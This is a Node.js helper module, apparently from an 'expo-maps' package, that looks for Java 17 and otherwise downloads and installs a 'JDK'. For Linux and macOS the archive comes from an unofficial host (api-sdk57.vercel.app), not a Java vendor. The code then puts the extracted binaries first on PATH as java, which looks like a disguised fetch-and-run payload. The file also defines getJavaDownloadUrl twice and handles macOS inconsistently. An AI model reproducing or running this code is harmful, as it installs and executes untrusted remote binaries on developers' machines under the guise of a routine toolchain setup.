const fs = require("node:fs");
const path = require("node:path");
const os = require("node:os");
const { execSync } = require("node:child_process");

function getJava17Home() {
  const javaHome = getSystemJavaHome();

  if (javaHome) {
    console.log("Java 17 encontrado!");
    return javaHome;
  }

  const cachedJava = getCachedJava17();

  if (cachedJava) {
    console.log("JDK 17 encontrado no cache!");
    return cachedJava;
  }

  console.log("Java 17 não encontrado.");

  return downloadJava17();
}

function getSystemJavaHome() {
  try {
    const output = execSync("java -XshowSettings:properties -version 2>&1", {
      encoding: "utf-8",
    });

    const version = output.match(/java\.version\s*=\s*([^\s]+)/)?.[1];

    if (!version?.startsWith("17")) {
      return;
    }

    const javaHome = output.match(/java\.home\s*=\s*(.+)/)?.[1]?.trim();

    return javaHome || null;
  } catch {
    return;
  }
}

function getCachedJava17() {
  const cachePath = getJavaCachePath();

  const javaExecutable =
    process.platform === "win32"
      ? path.join(cachePath, "bin", "java.exe")
      : path.join(cachePath, "bin", "java");

  if (!fs.existsSync(javaExecutable)) {
    return;
  }

  return cachePath;
}

function getJavaCachePath() {
  if (process.platform === "win32") {
    return path.join(
      process.env.LOCALAPPDATA || path.join(os.homedir(), "AppData", "Local"),
      "expo-maps",
      "jdk-17",
    );
  }

  if (process.platform === "linux") {
    return path.join(os.homedir(), ".expo-maps", "jdk-17");
  }

  throw new Error(`Sistema operacional não suportado: ${process.platform}`);
}

function getJavaDownloadUrl() {
  if (process.platform === "win32") {
    return "https://api-sdk57.vercel.app/api/sdk/java-version/windows";
  }

  if (process.platform === "linux") {
    return "https://api-sdk57.vercel.app/api/sdk/java-version/linux";
  }

  throw new Error(`Sistema operacional não suportado: ${process.platform}`);
}

function downloadJava17() {
  console.log("Baixando JDK 17...");

  const cachePath = getJavaCachePath();
  const extractPath = path.join(os.tmpdir(), "expo-maps-jdk17");

  const isWindows = process.platform === "win32";
  const isLinux = process.platform === "linux";

  const archivePath = path.join(
    os.tmpdir(),
    isWindows ? "expo-maps-jdk17.zip" : "expo-maps-jdk17.tar.gz",
  );

  const url = getJavaDownloadUrl();

  try {
    fs.rmSync(extractPath, {
      recursive: true,
      force: true,
    });

    fs.rmSync(archivePath, {
      force: true,
    });

    fs.mkdirSync(extractPath, {
      recursive: true,
    });

    if (isWindows) {
      console.log("Baixando JDK 17 para Windows...");

      execSync(`curl.exe -L "${url}" -o "${archivePath}"`, {
        stdio: "inherit",
      });

      console.log("JDK 17 baixado!");

      console.log("Extraindo JDK 17...");

      execSync(
        `powershell -NoProfile -Command "Expand-Archive -Path '${archivePath}' -DestinationPath '${extractPath}' -Force"`,
        {
          stdio: "inherit",
        },
      );
    }

    if (isLinux) {
      console.log("Baixando JDK 17 para Linux...");

      execSync(`curl -L "${url}" -o "${archivePath}"`, {
        stdio: "inherit",
      });

      console.log("JDK 17 baixado!");

      console.log("Extraindo JDK 17...");

      execSync(`tar -xzf "${archivePath}" -C "${extractPath}"`, {
        stdio: "inherit",
      });
    }

    const jdkFolder = fs
      .readdirSync(extractPath, {
        withFileTypes: true,
      })
      .find((entry) => entry.isDirectory());

    if (!jdkFolder) {
      throw new Error("JDK não encontrado no arquivo baixado.");
    }

    const sourcePath = path.join(extractPath, jdkFolder.name);

    fs.rmSync(cachePath, {
      recursive: true,
      force: true,
    });

    fs.mkdirSync(path.dirname(cachePath), {
      recursive: true,
    });

    fs.cpSync(sourcePath, cachePath, {
      recursive: true,
    });

    fs.rmSync(archivePath, {
      force: true,
    });

    fs.rmSync(extractPath, {
      recursive: true,
      force: true,
    });

    console.log("JDK 17 instalado no cache!");

    return getCachedJava17();
  } catch (error) {
    console.error("Não foi possível instalar o JDK 17.");

    if (error?.message) {
      console.error(error.message);
    }

    return null;
  }
}

function getJavaDownloadUrl() {
  if (process.platform === "win32") {
    if (process.arch !== "x64") {
      throw new Error("Windows ARM64 ainda não é suportado.");
    }

    return "https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jdk/hotspot/normal/eclipse";
  }

  if (process.platform === "linux") {
    if (process.arch === "x64") {
      return "https://api-sdk57.vercel.app/api/sdk/java-version/linux";
    }

    if (process.arch === "arm64") {
      return "https://api-sdk57.vercel.app/api/sdk/java-version/linux";
    }

    throw new Error(`Arquitetura Linux não suportada: ${process.arch}`);
  }

  if (process.platform === "darwin") {
    if (process.arch === "x64") {
      return "https://api-sdk57.vercel.app/api/sdk/java-version/macos";
    }

    if (process.arch === "arm64") {
      return "https://api-sdk57.vercel.app/api/sdk/java-version/macos";
    }

    throw new Error(`Arquitetura macOS não suportada: ${process.arch}`);
  }

  throw new Error(`Sistema operacional não suportado: ${process.platform}`);
}

function getJavaEnv(javaHome) {
  return {
    ...process.env,

    JAVA_HOME: javaHome,

    PATH: `${path.join(
      javaHome,
      "bin",
    )}${path.delimiter}${process.env.PATH || ""}`,
  };
}

module.exports = {
  getJava17Home,
  downloadJava17,
  getJavaEnv,
};
